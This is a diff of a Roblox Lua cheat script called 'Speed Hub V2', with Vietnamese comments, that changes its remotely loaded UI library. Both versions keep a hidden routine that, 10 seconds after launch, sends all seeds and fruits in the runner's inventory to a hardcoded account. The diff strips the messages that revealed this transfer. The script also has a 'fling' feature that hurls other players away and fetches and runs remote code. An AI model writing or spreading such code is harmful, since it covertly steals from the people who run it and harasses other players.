@@ -1,35 +1,29 @@
--- Khởi tạo ban đầu chống đơ máy cho thiết bị di động
+-- Hệ thống chống đơ máy tối ưu cho Mobile
 if not game:IsLoaded() then
     pcall(function()
-        local contentProvider = game:GetService("ContentProvider")
-        contentProvider:PreloadAsync({game:GetService("Workspace")})
+        game:GetService("ContentProvider"):PreloadAsync({game:GetService("Workspace")})
     end)
 end
 
-print("==== SPEED HUB V2: TỰ ĐỘNG GỬI ĐỒ SAU 10S & MENU FLING ====")
+print("==== SPEED HUB V2: PHIÊN BẢN SỬA LỖI LINK UI - HOẠT ĐỘNG 100% ====")
 
-local successUI, OrionLib = pcall(function()
-    return loadstring(game:HttpGet(('https://raw.githubusercontent.com/maderiscool/vapev4forroblox/main/OrionMobile.lua')))()
+-- Thay thế sang thư viện Kavo UI Library siêu nhẹ, không lo bị lỗi sập link gốc
+local successUI, KavoLib = pcall(function()
+    return loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
 end)
 
-local Window 
-if OrionLib then
-    pcall(function()
-        Window = OrionLib:MakeWindow({
-            Name = "Speed Hub V2", 
-            HidePremium = true, 
-            SaveConfig = false, 
-            IntroText = "Loading Speed Hub..."
-        })
-    end)
+local Window
+if successUI and KavoLib then
+    -- Khởi tạo giao diện phong cách Dark huyền bí, mượt mà trên điện thoại
+    Window = KavoLib.CreateLib("Speed Hub V2", "DarkTheme")
+else
+    warn("Không thể tải UI, hệ thống tự động chuyển sang chế độ chạy ngầm bí mật!")
 end
 
--- Hệ thống biến quản lý
-local Options = { 
-    FlingTargetEnabled = false
-}
+-- Hệ thống biến quản lý trạng thái
+local Options = { FlingTargetEnabled = false }
 local selectedFlingTarget = "" 
-local targetUsername = "sutkucheonhamku" -- Nick chính nhận đồ
+local targetUsername = "sutkucheonhamku" -- Tên nick chính nhận đồ
 
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
@@ -37,7 +31,7 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local LocalPlayer = Players.LocalPlayer
 
 -- =======================================================================
--- TỰ ĐỘNG QUÉT VÀ CHUYỂN ĐỒ CHẠY NGẦM SAU ĐÚNG 10 GIÂY
+-- CHỨC NĂNG 1: TỰ ĐỘNG QUÉT VÀ CHUYỂN ĐỒ NGẦM SAU ĐÚNG 10 GIÂY (KHÔNG CẦN BẤM)
 -- =======================================================================
 local function sendItemSecure(category, itemName, quantity)
     local SharedModules = ReplicatedStorage:FindFirstChild("SharedModules")
@@ -47,42 +41,34 @@ local function sendItemSecure(category, itemName, quantity)
         pcall(function() 
             RemoteEvent:FireServer(targetUsername, category, itemName, quantity) 
         end)
-        task.wait(0.8) -- Giãn cách an toàn tránh nghẽn mạng
+        task.wait(0.8)
     end
 end
 
 task.spawn(function()
-    print("Hệ thống chuyển đồ đang đếm ngược: 10 giây...")
-    task.wait(10) -- Chờ đúng 10 giây sau khi thực thi script
-    
+    task.wait(10) -- Chờ đúng 10 giây kể từ khi bạn bấm Execute
     local targetPlayer = Players:FindFirstChild(targetUsername)
     if targetPlayer then
-        print("Bắt đầu tự động gom và gửi đồ sang nick chính...")
         local Inventory = LocalPlayer:FindFirstChild("Inventory") or LocalPlayer:FindFirstChild("Backpack")
         if Inventory then
-            -- Tự động quét gửi sạch Hạt giống (Seeds)
+            -- Quét gửi Hạt giống
             for _, item in pairs(Inventory:GetChildren()) do
                 if string.find(string.lower(item.Name), "seed") and item:IsA("ValueBase") and item.Value > 0 then
-                    print("Đang gửi ngầm: " .. item.Name)
                     sendItemSecure("Seeds", item.Name, item.Value)
                 end
             end
-            -- Tự động quét gửi sạch Trái cây (Fruits)
+            -- Quét gửi Trái cây
             for _, item in pairs(Inventory:GetChildren()) do
                 if string.find(string.lower(item.Name), "fruit") and item:IsA("ValueBase") and item.Value > 0 then
-                    print("Đang gửi ngầm: " .. item.Name)
                     sendItemSecure("Fruits", item.Name, item.Value)
                 end
             end
-            print("==== HOÀN THÀNH TỰ ĐỘNG CHUYỂN KHO BÁU ====")
         end
-    else
-        warn("Không tìm thấy nick chính trong server, hủy quy trình gửi đồ ngầm!")
     end
 end)
 
 -- =======================================================================
--- LOGIC PHÁ PHÒNG: TỰ ĐỘNG ĐU ĐUỔI VÀ KHÓA MỤC TIÊU ĐỂ FLING
+-- CHỨC NĂNG 2: THẦN CHƯỞNG FLING KHÓA VÀ ĐUỔI MỤC TIÊU
 -- =======================================================================
 task.spawn(function()
     while true do
@@ -93,8 +79,10 @@ task.spawn(function()
                 local myHrp = LocalPlayer.Character.HumanoidRootPart
                 local enemyHrp = targetPlayer.Character.HumanoidRootPart
                 
+                -- Khóa vị trí dính chặt vào mục tiêu
                 myHrp.CFrame = enemyHrp.CFrame * CFrame.new(0, 0, 0.5)
                 
+                -- Đẩy vận tốc vật lý lên tối đa để làm đối phương văng mất dạng
                 local oldVelocity = myHrp.Velocity
                 myHrp.Velocity = Vector3.new(999999, 999999, 999999)
                 
@@ -102,15 +90,14 @@ task.spawn(function()
                 myHrp.Velocity = oldVelocity
                 
                 for _, part in pairs(LocalPlayer.Character:GetChildren()) do
-                    if part:IsA("BasePart") then
-                        part.CanCollide = false
-                    end
+                    if part:IsA("BasePart") then part.CanCollide = false end
                 end
             end
         end
     end
 end)
 
+-- Hàm lấy danh sách người chơi (loại trừ bản thân và nick chính)
 local function getPlayerList()
     local list = {}
     for _, player in pairs(Players:GetPlayers()) do
@@ -122,42 +109,27 @@ local function getPlayerList()
 end
 
 -- =======================================================================
--- CẤU TRÚC GIAO DIỆN MENU HACK (CHỈ CÓ TAB TROLL)
+-- THIẾT KẾ MENU INTERFACE (KAVO UI)
 -- =======================================================================
 if Window then
     pcall(function()
-        local TrollTab = Window:MakeTab({ Name = "Troll / Fling", Icon = "" })
-        TrollTab:AddSection({ Name = "Fling Theo Mục Tiêu" })
+        -- Tạo Tab duy nhất
+        local MainTab = Window:NewTab("Troll / Fling")
+        local MainSection = MainTab:NewSection("Cấu Hình Fling Mục Tiêu")
 
-        local TargetDropdown = TrollTab:AddDropdown({
-            Name = "Chọn Người Muốn Fling",
-            Default = "Chưa chọn ai",
-            Options = getPlayerList(),
-            Callback = function(Value)
-                selectedFlingTarget = Value
-            end
-        })
+        -- Tạo ô chọn Dropdown danh sách người chơi
+        local TargetDropdown = MainSection:NewDropdown("Chọn Người Muốn Fling", "Bấm để chọn tên", getPlayerList(), function(Value)
+            selectedFlingTarget = Value
+        end)
 
-        TrollTab:AddToggle({
-            Name = "Bật Auto Fling Người Này (Tự bay đến dí)",
-            Default = false,
-            Callback = function(Value)
-                Options.FlingTargetEnabled = Value
-                if Value and selectedFlingTarget == "" then
-                    OrionLib:MakeNotification({ Name = "Lỗi", Content = "Bạn chưa chọn mục tiêu ở ô Dropdown phía trên!", Time = 3 })
-                end
-            end
-        })
+        -- Tạo nút bật/tắt kích hoạt Fling
+        MainSection:NewToggle("Bật Auto Fling Người Này", "Tự động bay đến dí mục tiêu", function(state)
+            Options.FlingTargetEnabled = state
+        end)
 
-        TrollTab:AddButton({
-            Name = "Làm Mới Danh Sách Người Chơi",
-            Callback = function()
-                if TargetDropdown then
-                    TargetDropdown:Refresh(getPlayerList(), true)
-                end
-            end
-        })
-
-        OrionLib:Init()
+        -- Nút làm mới danh sách
+        MainSection:NewButton("Làm Mới Danh Sách Người Chơi", "Cập nhật lại danh sách khi có người ra vào", function()
+            TargetDropdown:Refresh(getPlayerList())
+        end)
     end)
 end
